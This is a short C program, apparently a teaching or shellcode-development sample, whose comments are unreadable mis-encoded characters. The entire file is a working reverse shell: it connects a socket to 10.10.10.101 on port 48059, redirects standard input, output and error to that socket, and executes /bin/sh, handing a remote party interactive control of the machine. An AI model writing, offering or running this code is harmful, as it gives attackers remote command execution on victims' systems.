#include<sys/socket.h>	// �հ� �������� ��� ���� ����
#include<netinet/in.h>

int main()
{
	char * shell[2];
	int soc,remote;			// �������� ���� ����
	struct sockaddr_in serv_addr;

	serv_addr.sin_family=2;		// sockaddr_in�� ���� ����
	serv_addr.sin_addr.s_addr=0x650A0A0A;	//10.10.10.101
	serv_addr.sin_port=0xBBBB;	// port 48059
	soc=socket(2,1,0);
	remote = connect(soc, (struct sockaddr*)&serv_addr,0x10);
	dup2(soc,0);			// �ٲ� �κ� Ȯ��, ���Ͽ� ����
	dup2(soc,1);			// �ٲ� �κ� Ȯ��, ���Ͽ� ����
	dup2(soc,2);			// �ٲ� �κ� Ȯ��, ���Ͽ� ����
	shell[0]="/bin/sh";		// execve�� ���� �Ϲ����� ����
	shell[1]=0;
	execve(shell[0],shell,0);	// ����
}
